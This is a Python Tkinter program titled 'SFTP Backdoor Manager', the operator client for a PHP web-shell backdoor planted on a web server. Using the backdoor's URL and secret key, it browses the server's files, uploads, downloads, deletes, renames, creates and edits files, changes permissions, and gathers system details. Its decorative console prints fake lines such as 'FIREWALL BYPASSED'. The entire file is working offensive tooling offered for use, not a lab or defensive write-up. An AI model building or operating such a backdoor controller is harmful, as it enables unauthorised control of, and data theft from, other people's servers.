import tkinter as tk
from tkinter import ttk, filedialog, messagebox, simpledialog, scrolledtext
import requests
import os
import json
from datetime import datetime
import random

class SFTPBackdoorGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("SFTP Backdoor Manager")
        self.root.geometry("1200x800")
        self.root.configure(bg='#0a0a0a')
        
        # Set style for dark theme with neon colors
        self.style = ttk.Style()
        self.style.theme_use('clam')
        
        # Configure styles
        self.style.configure('TFrame', background='#0a0a0a')
        self.style.configure('TLabel', background='#0a0a0a', foreground='#00ff00', font=('Consolas', 10))
        self.style.configure('TButton', background='#1a1a1a', foreground='#00ff00', 
                            borderwidth=1, focuscolor='none', font=('Consolas', 10))
        self.style.map('TButton', background=[('active', '#2a2a2a')])
        self.style.configure('TEntry', background='#1a1a1a', foreground='#00ff00', 
                            fieldbackground='#1a1a1a', borderwidth=1, font=('Consolas', 10))
        self.style.configure('TNotebook', background='#0a0a0a', borderwidth=0)
        self.style.configure('TNotebook.Tab', background='#1a1a1a', foreground='#00ff00', 
                            padding=[10, 5], font=('Consolas', 10))
        self.style.map('TNotebook.Tab', background=[('selected', '#2a2a2a')])
        self.style.configure('Treeview', background='#1a1a1a', foreground='#00ff00', 
                            fieldbackground='#1a1a1a', borderwidth=0, font=('Consolas', 9))
        self.style.configure('Treeview.Heading', background='#0a0a0a', foreground='#00ff00', 
                            font=('Consolas', 10, 'bold'))
        self.style.map('Treeview', background=[('selected', '#2a2a2a')])
        
        self.session = requests.Session()
        self.backdoor_url = ""
        self.secret_key = ""
        self.current_remote_path = "."
        
        # Parameter names from PHP backdoor
        self.auth_param = "key"
        self.op_param = "task"
        self.path_param = "location"
        self.file_param = "data"
        self.old_param = "source"
        self.new_param = "target"
        self.content_param = "content"
        self.mode_param = "mode"
        
        # Create matrix rain background first
        self.create_matrix_rain()
        
        # Create other widgets
        self.create_widgets()
        self.create_hacker_effects()
        
    def create_widgets(self):
        # Create notebook for tabs
        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill="both", expand=True, padx=10, pady=5)
        
        # File Manager Tab
        self.file_manager_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.file_manager_frame, text="File Manager")
        
        # System Info Tab
        self.sysinfo_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.sysinfo_frame, text="System Information")
        
        # Create File Manager tab content
        self.create_file_manager_tab()
        
        # Create System Info tab content
        self.create_sysinfo_tab()
        
        # Status Bar
        self.status_var = tk.StringVar()
        self.status_var.set("Ready")
        status_bar = ttk.Label(self.root, textvariable=self.status_var, relief="sunken", anchor="w")
        status_bar.pack(fill="x", padx=10, pady=2)
        
    def create_file_manager_tab(self):
        # Connection Frame
        conn_frame = ttk.Frame(self.file_manager_frame)
        conn_frame.pack(fill="x", padx=10, pady=5)
        
        # Add hacker-style title
        title_label = tk.Label(conn_frame, text="[ CONNECTION PARAMETERS ]", 
                              bg='#0a0a0a', fg='#00ff00', font=('Consolas', 12, 'bold'))
        title_label.grid(row=0, column=0, columnspan=2, sticky="w", padx=5, pady=5)
        
        ttk.Label(conn_frame, text="URL:").grid(row=1, column=0, sticky="w", padx=5)
        self.url_entry = ttk.Entry(conn_frame, width=60)
        self.url_entry.grid(row=1, column=1, padx=5, pady=5)
        
        ttk.Label(conn_frame, text="Secret Key:").grid(row=2, column=0, sticky="w", padx=5)
        self.key_entry = ttk.Entry(conn_frame, width=60, show="*")
        self.key_entry.grid(row=2, column=1, padx=5, pady=5)
        
        self.connect_btn = ttk.Button(conn_frame, text="[ CONNECT ]", command=self.connect)
        self.connect_btn.grid(row=3, column=1, sticky="e", padx=5, pady=5)
        
        # Breadcrumb Navigation
        breadcrumb_frame = ttk.Frame(self.file_manager_frame)
        breadcrumb_frame.pack(fill="x", padx=10, pady=5)
        
        self.breadcrumb_label = tk.Label(breadcrumb_frame, text="Path: /", 
                                        bg='#0a0a0a', fg='#00ff00', font=('Consolas', 10))
        self.breadcrumb_label.pack(side="left", padx=5)
        
        # Debug Frame
        debug_frame = ttk.LabelFrame(self.file_manager_frame, text="[ DEBUG CONSOLE ]")
        debug_frame.pack(fill="x", padx=10, pady=5)
        
        self.debug_text = scrolledtext.ScrolledText(debug_frame, height=5, wrap=tk.WORD, 
                                                   bg='#1a1a1a', fg='#00ff00', 
                                                   font=('Consolas', 9), insertbackground='#00ff00')
        self.debug_text.pack(fill="x", padx=5, pady=5)
        
        # Main Content Area
        main_frame = ttk.Frame(self.file_manager_frame)
        main_frame.pack(fill="both", expand=True, padx=10, pady=5)
        
        # Remote Files Section
        remote_frame = ttk.LabelFrame(main_frame, text="[ REMOTE FILES ]")
        remote_frame.pack(fill="both", expand=True, side="left", padx=5)
        
        # Path Navigation
        path_nav = ttk.Frame(remote_frame)
        path_nav.pack(fill="x", padx=5, pady=5)
        
        ttk.Button(path_nav, text="⬅", command=self.go_up, width=3).pack(side="left")
        self.path_label = tk.Label(path_nav, text="Path: /", 
                                   bg='#0a0a0a', fg='#00ff00', font=('Consolas', 10))
        self.path_label.pack(side="left", padx=10)
        
        # File List
        self.tree = ttk.Treeview(remote_frame, columns=("size", "modified", "permissions"), selectmode="extended")
        self.tree.heading("#0", text="Name")
        self.tree.heading("size", text="Size")
        self.tree.heading("modified", text="Modified")
        self.tree.heading("permissions", text="Permissions")
        self.tree.column("#0", width=300)
        self.tree.column("size", width=100)
        self.tree.column("modified", width=150)
        self.tree.column("permissions", width=80)
        self.tree.pack(fill="both", expand=True, padx=5, pady=5)
        self.tree.bind("<Double-1>", self.on_double_click)
        
        # Scrollbar
        scrollbar = ttk.Scrollbar(remote_frame, orient="vertical", command=self.tree.yview)
        scrollbar.pack(side="right", fill="y")
        self.tree.configure(yscrollcommand=scrollbar.set)
        
        # Control Buttons
        control_frame = ttk.Frame(remote_frame)
        control_frame.pack(fill="x", padx=5, pady=5)
        
        ttk.Button(control_frame, text="[ UPLOAD ]", command=self.upload_file).pack(side="left", padx=2)
        ttk.Button(control_frame, text="[ DOWNLOAD ]", command=self.download_file).pack(side="left", padx=2)
        ttk.Button(control_frame, text="[ DELETE ]", command=self.delete_file).pack(side="left", padx=2)
        ttk.Button(control_frame, text="[ RENAME ]", command=self.rename_file).pack(side="left", padx=2)
        ttk.Button(control_frame, text="[ NEW FOLDER ]", command=self.create_folder).pack(side="left", padx=2)
        ttk.Button(control_frame, text="[ NEW FILE ]", command=self.create_file).pack(side="left", padx=2)
        ttk.Button(control_frame, text="[ VIEW FILE ]", command=self.view_file).pack(side="left", padx=2)
        ttk.Button(control_frame, text="[ EDIT CHMOD ]", command=self.edit_chmod).pack(side="left", padx=2)
        ttk.Button(control_frame, text="[ REFRESH ]", command=self.refresh_remote).pack(side="left", padx=2)
        
    def create_sysinfo_tab(self):
        # System Info Display
        info_frame = ttk.Frame(self.sysinfo_frame)
        info_frame.pack(fill="both", expand=True, padx=10, pady=10)
        
        # Add hacker-style title
        title_label = tk.Label(info_frame, text="[ SYSTEM INFORMATION ]", 
                              bg='#0a0a0a', fg='#00ff00', font=('Consolas', 14, 'bold'))
        title_label.pack(pady=10)
        
        # Create treeview for system info
        self.sysinfo_tree = ttk.Treeview(info_frame, columns=("value",), selectmode="extended")
        self.sysinfo_tree.heading("#0", text="Property")
        self.sysinfo_tree.heading("value", text="Value")
        self.sysinfo_tree.column("#0", width=250)
        self.sysinfo_tree.column("value", width=700)
        self.sysinfo_tree.pack(fill="both", expand=True, padx=5, pady=5)
        
        # Refresh button
        refresh_btn = ttk.Button(info_frame, text="[ REFRESH SYSTEM INFO ]", command=self.refresh_sysinfo)
        refresh_btn.pack(pady=10)
        
    def create_hacker_effects(self):
        # Add a terminal-style header
        header_frame = tk.Frame(self.root, bg='#0a0a0a')
        header_frame.pack(fill="x", padx=10, pady=5)
        
        title = tk.Label(header_frame, text="▀▄▀▄▀▄ SFTP BACKDOOR MANAGER ▄▀▄▀▄▀", 
                         bg='#0a0a0a', fg='#00ff00', font=('Consolas', 16, 'bold'))
        title.pack()
        
        subtitle = tk.Label(header_frame, text="[ SECURE CONNECTION ESTABLISHED ]", 
                           bg='#0a0a0a', fg='#00ff00', font=('Consolas', 10))
        subtitle.pack()
        
    def create_matrix_rain(self):
        # Create a canvas for the matrix rain effect
        self.canvas = tk.Canvas(self.root, bg='#0a0a0a', highlightthickness=0)
        self.canvas.place(x=0, y=0, relwidth=1, relheight=1)
        
        # Initialize matrix rain
        self.width = self.root.winfo_reqwidth()
        self.height = self.root.winfo_reqheight()
        
        # Create matrix characters
        self.chars = "01"
        self.char_size = 14
        self.columns = self.width // self.char_size
        
        # Initialize drops
        self.drops = [0 for _ in range(self.columns)]
        
        # Start the animation
        self.animate_matrix()
        
    def animate_matrix(self):
        # Draw characters
        for i in range(len(self.drops)):
            # Random character
            char = random.choice(self.chars)
            
            # Position
            x = i * self.char_size
            y = self.drops[i] * self.char_size
            
            # Color (green with varying brightness)
            brightness = random.randint(100, 255)
            color = f'#{0:02x}{brightness:02x}{0:02x}'
            
            # Draw character
            self.canvas.create_text(x, y, text=char, fill=color, font=('Consolas', self.char_size), tags="matrix")
            
            # Move drop down
            if y > self.height and random.random() > 0.975:
                self.drops[i] = 0
            self.drops[i] += 1
        
        # Remove old characters
        self.canvas.delete("matrix")
        
        # Schedule next frame
        self.root.after(100, self.animate_matrix)
        
    def update_breadcrumb(self):
        # Clear existing breadcrumb
        for widget in self.breadcrumb_label.winfo_children():
            widget.destroy()
        
        # Create new breadcrumb
        path_parts = self.current_remote_path.split('/')
        breadcrumb_path = ""
        
        # Add root
        root_btn = tk.Button(self.breadcrumb_label, text="/", 
                             command=lambda: self.navigate_to_path("."),
                             bg='#0a0a0a', fg='#00ff00', bd=0, font=('Consolas', 10))
        root_btn.pack(side="left", padx=2)
        
        # Add path parts
        for i, part in enumerate(path_parts):
            if part:  # Skip empty parts
                breadcrumb_path += "/" + part
                
                # Add separator
                sep_label = tk.Label(self.breadcrumb_label, text="/", 
                                   bg='#0a0a0a', fg='#00ff00', font=('Consolas', 10))
                sep_label.pack(side="left")
                
                # Add path part button
                part_btn = tk.Button(self.breadcrumb_label, text=part, 
                                    command=lambda p=breadcrumb_path: self.navigate_to_path(p),
                                    bg='#0a0a0a', fg='#00ff00', bd=0, font=('Consolas', 10))
                part_btn.pack(side="left", padx=2)
    
    def navigate_to_path(self, path):
        self.current_remote_path = path
        self.refresh_remote()
        
    def log_debug(self, message):
        # Add timestamp
        timestamp = datetime.now().strftime('%H:%M:%S.%f')[:-3]
        self.debug_text.insert(tk.END, f"[{timestamp}] {message}\n")
        self.debug_text.see(tk.END)
        
        # Add random "hacker" effects to the debug console
        if random.random() < 0.1:  # 10% chance
            effects = [
                ">> ACCESS GRANTED",
                ">> AUTHENTICATION SUCCESSFUL",
                ">> ENCRYPTED CHANNEL",
                ">> SECURE CONNECTION",
                ">> DATA TRANSFER INITIALIZED",
                ">> SYSTEM BREACH DETECTED",
                ">> FIREWALL BYPASSED",
                ">> ADMIN PRIVILEGES ACQUIRED"
            ]
            self.debug_text.insert(tk.END, f"[{timestamp}] {random.choice(effects)}\n")
            self.debug_text.see(tk.END)
        
    def connect(self):
        self.backdoor_url = self.url_entry.get().strip()
        self.secret_key = self.key_entry.get().strip()
        
        if not self.backdoor_url or not self.secret_key:
            messagebox.showerror("Error", "URL and Secret Key required!")
            return
            
        try:
            self.log_debug(f"Connecting to: {self.backdoor_url}")
            self.log_debug(f"Using parameters: {self.auth_param}={self.secret_key[:5]}..., {self.op_param}=scan, {self.path_param}=.")
            
            # Test connection
            response = self.session.post(
                self.backdoor_url,
                data={
                    self.auth_param: self.secret_key, 
                    self.op_param: 'scan', 
                    self.path_param: '.'
                },
                timeout=10
            )
            
            self.log_debug(f"Response status: {response.status_code}")
            self.log_debug(f"Response headers: {dict(response.headers)}")
            
            if response.status_code == 200:
                try:
                    files = json.loads(response.text)
                    self.log_debug(f"Response JSON: {response.text[:200]}...")
                    self.refresh_remote()
                    self.status_var.set("Connected successfully")
                    messagebox.showinfo("Success", "Connected!")
                except json.JSONDecodeError as e:
                    self.log_debug(f"JSON decode error: {str(e)}")
                    self.log_debug(f"Raw response: {response.text}")
                    self.status_var.set("Invalid response format")
                    messagebox.showerror("Error", "Invalid response format from server")
            else:
                self.log_debug(f"Error response: {response.text}")
                self.status_var.set("Connection failed")
                messagebox.showerror("Error", f"Connection failed: {response.status_code} - {response.text}")
        except requests.exceptions.RequestException as e:
            self.log_debug(f"Request exception: {str(e)}")
            self.status_var.set("Connection error")
            messagebox.showerror("Error", f"Connection error: {str(e)}")
        except Exception as e:
            self.log_debug(f"Unexpected error: {str(e)}")
            self.status_var.set("Unexpected error")
            messagebox.showerror("Error", f"Unexpected error: {str(e)}")
    
    def refresh_remote(self):
        try:
            self.status_var.set("Loading directory...")
            self.log_debug(f"Refreshing directory: {self.current_remote_path}")
            
            response = self.session.post(
                self.backdoor_url,
                data={
                    self.auth_param: self.secret_key, 
                    self.op_param: 'scan', 
                    self.path_param: self.current_remote_path
                },
                timeout=10
            )
            
            self.log_debug(f"Refresh response status: {response.status_code}")
            
            if response.status_code == 200:
                try:
                    files = json.loads(response.text)
                    self.tree.delete(*self.tree.get_children())
                    
                    # Add parent directory
                    if self.current_remote_path != ".":
                        self.tree.insert("", "end", text="..", values=("", "", ""), tags=("dir",))
                    
                    for item in files:
                        item_type = "dir" if item['type'] == 'folder' else "file"
                        size = self.format_size(item['size']) if item_type == "file" else "<DIR>"
                        modified = datetime.fromtimestamp(item['modified']).strftime('%Y-%m-%d %H:%M')
                        permissions = item.get('perms', '0000')
                        self.tree.insert("", "end", text=item['name'], 
                                      values=(size, modified, permissions), tags=(item_type,))
                    
                    self.path_label.config(text=f"Path: {self.current_remote_path}")
                    self.update_breadcrumb()  # Update breadcrumb navigation
                    self.status_var.set(f"Loaded {len(files)} items")
                    self.log_debug(f"Successfully loaded {len(files)} items")
                except json.JSONDecodeError as e:
                    self.log_debug(f"JSON decode error: {str(e)}")
                    self.log_debug(f"Raw response: {response.text}")
                    self.status_var.set("Invalid response format")
                    messagebox.showerror("Error", "Invalid response format from server")
            else:
                self.log_debug(f"Error response: {response.text}")
                self.status_var.set("Failed to load directory")
                messagebox.showerror("Error", f"Failed to load: {response.text}")
                
        except Exception as e:
            self.log_debug(f"Error refreshing: {str(e)}")
            self.status_var.set("Error loading directory")
            messagebox.showerror("Error", f"Error: {str(e)}")
    
    def refresh_sysinfo(self):
        try:
            self.status_var.set("Loading system information...")
            self.log_debug("Loading system information...")
            
            response = self.session.post(
                self.backdoor_url,
                data={
                    self.auth_param: self.secret_key, 
                    self.op_param: 'report'
                },
                timeout=10
            )
            
            self.log_debug(f"Sysinfo response status: {response.status_code}")
            
            if response.status_code == 200:
                try:
                    sysinfo = json.loads(response.text)
                    self.sysinfo_tree.delete(*self.sysinfo_tree.get_children())
                    
                    # Map internal names to display names
                    display_names = {
                        'engine': 'PHP Version',
                        'platform': 'Server OS',
                        'httpd': 'Web Server',
                        'user': 'Current User',
                        'doc_root': 'Document Root',
                        'current_dir': 'Current Directory',
                        'disk_total': 'Disk Total',
                        'disk_free': 'Disk Free'
                    }
                    
                    for key, value in sysinfo.items():
                        display_name = display_names.get(key, key)
                        self.sysinfo_tree.insert("", "end", text=display_name, values=(value,))
                    
                    self.status_var.set("System information loaded")
                    self.log_debug("System information loaded successfully")
                except json.JSONDecodeError as e:
                    self.log_debug(f"JSON decode error: {str(e)}")
                    self.log_debug(f"Raw response: {response.text}")
                    self.status_var.set("Invalid response format")
                    messagebox.showerror("Error", "Invalid response format from server")
            else:
                self.log_debug(f"Error response: {response.text}")
                self.status_var.set("Failed to load system information")
                messagebox.showerror("Error", f"Failed to load: {response.text}")
                
        except Exception as e:
            self.log_debug(f"Error loading sysinfo: {str(e)}")
            self.status_var.set("Error loading system information")
            messagebox.showerror("Error", f"Error: {str(e)}")
    
    def format_size(self, size):
        for unit in ['B', 'KB', 'MB', 'GB']:
            if size < 1024:
                return f"{size:.1f} {unit}"
            size /= 1024
        return f"{size:.1f} TB"
    
    def on_double_click(self, event):
        item = self.tree.selection()[0]
        item_text = self.tree.item(item, "text")
        item_tags = self.tree.item(item, "tags")
        
        if "dir" in item_tags:
            if item_text == "..":
                self.go_up()
            else:
                # Navigate into directory
                new_path = f"{self.current_remote_path}/{item_text}" if self.current_remote_path != "." else item_text
                self.current_remote_path = new_path
                self.refresh_remote()
    
    def go_up(self):
        if self.current_remote_path != ".":
            path_parts = self.current_remote_path.split('/')
            if len(path_parts) > 1:
                self.current_remote_path = '/'.join(path_parts[:-1])
            else:
                self.current_remote_path = "."
            self.refresh_remote()
    
    def upload_file(self):
        file_path = filedialog.askopenfilename()
        if file_path:
            try:
                self.status_var.set("Uploading file...")
                self.log_debug(f"Uploading file: {file_path}")
                
                with open(file_path, 'rb') as f:
                    files = {self.file_param: (os.path.basename(file_path), f)}
                    response = self.session.post(
                        self.backdoor_url,
                        data={
                            self.auth_param: self.secret_key, 
                            self.op_param: 'import', 
                            self.path_param: self.current_remote_path
                        },
                        files=files,
                        timeout=60
                    )
                
                self.log_debug(f"Upload response status: {response.status_code}")
                self.log_debug(f"Upload response: {response.text}")
                
                if response.status_code == 200:
                    self.status_var.set("Upload successful")
                    messagebox.showinfo("Success", "File uploaded!")
                    self.refresh_remote()
                else:
                    self.status_var.set("Upload failed")
                    messagebox.showerror("Error", f"Upload failed: {response.text}")
            except Exception as e:
                self.log_debug(f"Upload error: {str(e)}")
                self.status_var.set("Upload error")
                messagebox.showerror("Error", f"Upload error: {str(e)}")
    
    def download_file(self):
        selected = self.tree.selection()
        if not selected:
            messagebox.showwarning("Warning", "Select a file to download!")
            return
            
        item = self.tree.item(selected[0])
        filename = item['text']
        
        if "dir" in item['tags']:
            messagebox.showwarning("Warning", "Cannot download directories!")
            return
            
        save_path = filedialog.asksaveasfilename(initialfile=filename)
        if save_path:
            try:
                self.status_var.set("Downloading file...")
                self.log_debug(f"Downloading file: {filename}")
                
                file_path = f"{self.current_remote_path}/{filename}" if self.current_remote_path != "." else filename
                response = self.session.post(
                    self.backdoor_url,
                    data={
                        self.auth_param: self.secret_key, 
                        self.op_param: 'export', 
                        self.path_param: file_path
                    },
                    stream=True,
                    timeout=60
                )
                
                self.log_debug(f"Download response status: {response.status_code}")
                
                if response.status_code == 200:
                    with open(save_path, 'wb') as f:
                        for chunk in response.iter_content(chunk_size=8192):
                            f.write(chunk)
                    self.status_var.set("Download successful")
                    messagebox.showinfo("Success", "File downloaded!")
                else:
                    self.status_var.set("Download failed")
                    messagebox.showerror("Error", "Download failed")
            except Exception as e:
                self.log_debug(f"Download error: {str(e)}")
                self.status_var.set("Download error")
                messagebox.showerror("Error", f"Download error: {str(e)}")
    
    def delete_file(self):
        selected = self.tree.selection()
        if not selected:
            messagebox.showwarning("Warning", "Select an item to delete!")
            return
            
        item = self.tree.item(selected[0])
        filename = item['text']
        
        if messagebox.askyesno("Confirm", f"Delete {filename}?"):
            try:
                self.status_var.set("Deleting item...")
                self.log_debug(f"Deleting item: {filename}")
                
                file_path = f"{self.current_remote_path}/{filename}" if self.current_remote_path != "." else filename
                response = self.session.post(
                    self.backdoor_url,
                    data={
                        self.auth_param: self.secret_key, 
                        self.op_param: 'remove', 
                        self.path_param: file_path
                    },
                    timeout=10
                )
                
                self.log_debug(f"Delete response status: {response.status_code}")
                self.log_debug(f"Delete response: {response.text}")
                
                if response.status_code == 200:
                    self.status_var.set("Delete successful")
                    messagebox.showinfo("Success", "Item deleted!")
                    self.refresh_remote()
                else:
                    self.status_var.set("Delete failed")
                    messagebox.showerror("Error", f"Delete failed: {response.text}")
            except Exception as e:
                self.log_debug(f"Delete error: {str(e)}")
                self.status_var.set("Delete error")
                messagebox.showerror("Error", f"Delete error: {str(e)}")
    
    def rename_file(self):
        selected = self.tree.selection()
        if not selected:
            messagebox.showwarning("Warning", "Select an item to rename!")
            return
            
        item = self.tree.item(selected[0])
        old_name = item['text']
        
        new_name = simpledialog.askstring("Rename", "Enter new name:", initialvalue=old_name)
        if new_name and new_name != old_name:
            try:
                self.status_var.set("Renaming item...")
                self.log_debug(f"Renaming {old_name} to {new_name}")
                
                old_path = f"{self.current_remote_path}/{old_name}" if self.current_remote_path != "." else old_name
                new_path = f"{self.current_remote_path}/{new_name}" if self.current_remote_path != "." else new_name
                
                response = self.session.post(
                    self.backdoor_url,
                    data={
                        self.auth_param: self.secret_key, 
                        self.op_param: 'relocate', 
                        self.old_param: old_path, 
                        self.new_param: new_path
                    },
                    timeout=10
                )
                
                self.log_debug(f"Rename response status: {response.status_code}")
                self.log_debug(f"Rename response: {response.text}")
                
                if response.status_code == 200:
                    self.status_var.set("Rename successful")
                    messagebox.showinfo("Success", "Item renamed!")
                    self.refresh_remote()
                else:
                    self.status_var.set("Rename failed")
                    messagebox.showerror("Error", f"Rename failed: {response.text}")
            except Exception as e:
                self.log_debug(f"Rename error: {str(e)}")
                self.status_var.set("Rename error")
                messagebox.showerror("Error", f"Rename error: {str(e)}")
    
    def create_folder(self):
        folder_name = simpledialog.askstring("New Folder", "Enter folder name:")
        if folder_name:
            try:
                self.status_var.set("Creating folder...")
                self.log_debug(f"Creating folder: {folder_name}")
                
                folder_path = f"{self.current_remote_path}/{folder_name}" if self.current_remote_path != "." else folder_name
                response = self.session.post(
                    self.backdoor_url,
                    data={
                        self.auth_param: self.secret_key, 
                        self.op_param: 'organize', 
                        self.path_param: folder_path
                    },
                    timeout=10
                )
                
                self.log_debug(f"Create folder response status: {response.status_code}")
                self.log_debug(f"Create folder response: {response.text}")
                
                if response.status_code == 200:
                    self.status_var.set("Folder created")
                    messagebox.showinfo("Success", "Folder created!")
                    self.refresh_remote()
                else:
                    self.status_var.set("Folder creation failed")
                    messagebox.showerror("Error", f"Folder creation failed: {response.text}")
            except Exception as e:
                self.log_debug(f"Create folder error: {str(e)}")
                self.status_var.set("Folder creation error")
                messagebox.showerror("Error", f"Folder creation error: {str(e)}")
    
    def create_file(self):
        file_name = simpledialog.askstring("New File", "Enter file name:")
        if file_name:
            # Open editor window
            editor = tk.Toplevel(self.root)
            editor.title(f"Edit: {file_name}")
            editor.geometry("800x600")
            editor.configure(bg='#0a0a0a')
            
            # Apply hacker theme to editor
            title_label = tk.Label(editor, text=f"[ EDITING: {file_name} ]", 
                                 bg='#0a0a0a', fg='#00ff00', font=('Consolas', 12, 'bold'))
            title_label.pack(pady=10)
            
            text_area = scrolledtext.ScrolledText(editor, wrap=tk.WORD, width=80, height=25,
                                               bg='#1a1a1a', fg='#00ff00', 
                                               font=('Consolas', 10), insertbackground='#00ff00')
            text_area.pack(padx=10, pady=10, fill="both", expand=True)
            
            def save_file():
                content = text_area.get("1.0", tk.END)
                file_path = f"{self.current_remote_path}/{file_name}" if self.current_remote_path != "." else file_name
                
                try:
                    self.log_debug(f"Creating file: {file_path}")
                    
                    response = self.session.post(
                        self.backdoor_url,
                        data={
                            self.auth_param: self.secret_key, 
                            self.op_param: 'compose', 
                            self.path_param: file_path, 
                            self.content_param: content
                        },
                        timeout=10
                    )
                    
                    self.log_debug(f"Create file response status: {response.status_code}")
                    self.log_debug(f"Create file response: {response.text}")
                    
                    if response.status_code == 200:
                        messagebox.showinfo("Success", "File created!")
                        self.refresh_remote()
                        editor.destroy()
                    else:
                        messagebox.showerror("Error", f"File creation failed: {response.text}")
                except Exception as e:
                    self.log_debug(f"Create file error: {str(e)}")
                    messagebox.showerror("Error", f"File creation error: {str(e)}")
            
            button_frame = ttk.Frame(editor)
            button_frame.pack(fill="x", padx=10, pady=5)
            
            ttk.Button(button_frame, text="[ SAVE ]", command=save_file).pack(side="right", padx=5)
            ttk.Button(button_frame, text="[ CANCEL ]", command=editor.destroy).pack(side="right", padx=5)
    
    def view_file(self):
        selected = self.tree.selection()
        if not selected:
            messagebox.showwarning("Warning", "Select a file to view!")
            return
            
        item = self.tree.item(selected[0])
        filename = item['text']
        
        if "dir" in item['tags']:
            messagebox.showwarning("Warning", "Cannot view directories!")
            return
            
        file_path = f"{self.current_remote_path}/{filename}" if self.current_remote_path != "." else filename
        
        try:
            self.status_var.set("Loading file content...")
            self.log_debug(f"Viewing file: {file_path}")
            
            response = self.session.post(
                self.backdoor_url,
                data={
                    self.auth_param: self.secret_key, 
                    self.op_param: 'examine', 
                    self.path_param: file_path
                },
                timeout=10
            )
            
            self.log_debug(f"View file response status: {response.status_code}")
            
            if response.status_code == 200:
                content = response.text
                
                # Open viewer window
                viewer = tk.Toplevel(self.root)
                viewer.title(f"View: {filename}")
                viewer.geometry("900x700")
                viewer.configure(bg='#0a0a0a')
                
                # Apply hacker theme to viewer
                title_label = tk.Label(viewer, text=f"[ VIEWING: {filename} ]", 
                                     bg='#0a0a0a', fg='#00ff00', font=('Consolas', 12, 'bold'))
                title_label.pack(pady=10)
                
                text_area = scrolledtext.ScrolledText(viewer, wrap=tk.WORD, width=90, height=30,
                                                   bg='#1a1a1a', fg='#00ff00', 
                                                   font=('Consolas', 10), insertbackground='#00ff00')
                text_area.pack(padx=10, pady=10, fill="both", expand=True)
                text_area.insert("1.0", content)
                text_area.config(state="disabled")
                
                button_frame = ttk.Frame(viewer)
                button_frame.pack(fill="x", padx=10, pady=5)
                
                ttk.Button(button_frame, text="[ CLOSE ]", command=viewer.destroy).pack(side="right", padx=5)
                
                self.status_var.set("File loaded")
            else:
                self.log_debug(f"Error response: {response.text}")
                self.status_var.set("Failed to load file")
                messagebox.showerror("Error", f"Failed to load file: {response.text}")
        except Exception as e:
            self.log_debug(f"View file error: {str(e)}")
            self.status_var.set("Error loading file")
            messagebox.showerror("Error", f"Error loading file: {str(e)}")
    
    def edit_chmod(self):
        selected = self.tree.selection()
        if not selected:
            messagebox.showwarning("Warning", "Select an item to edit permissions!")
            return
            
        item = self.tree.item(selected[0])
        filename = item['text']
        current_perms = item['values'][2] if len(item['values']) > 2 else "0644"
        
        new_perms = simpledialog.askstring("Edit Chmod", "Enter new permissions (e.g., 0755):", initialvalue=current_perms)
        if new_perms:
            try:
                self.status_var.set("Changing permissions...")
                self.log_debug(f"Changing permissions for {filename} to {new_perms}")
                
                file_path = f"{self.current_remote_path}/{filename}" if self.current_remote_path != "." else filename
                response = self.session.post(
                    self.backdoor_url,
                    data={
                        self.auth_param: self.secret_key, 
                        self.op_param: 'configure', 
                        self.path_param: file_path, 
                        self.mode_param: new_perms
                    },
                    timeout=10
                )
                
                self.log_debug(f"Chmod response status: {response.status_code}")
                self.log_debug(f"Chmod response: {response.text}")
                
                if response.status_code == 200:
                    self.status_var.set("Permissions changed")
                    messagebox.showinfo("Success", "Permissions changed!")
                    self.refresh_remote()
                else:
                    self.status_var.set("Permission change failed")
                    messagebox.showerror("Error", f"Permission change failed: {response.text}")
            except Exception as e:
                self.log_debug(f"Chmod error: {str(e)}")
                self.status_var.set("Permission change error")
                messagebox.showerror("Error", f"Permission change error: {str(e)}")

if __name__ == "__main__":
    root = tk.Tk()
    app = SFTPBackdoorGUI(root)
    root.mainloop()
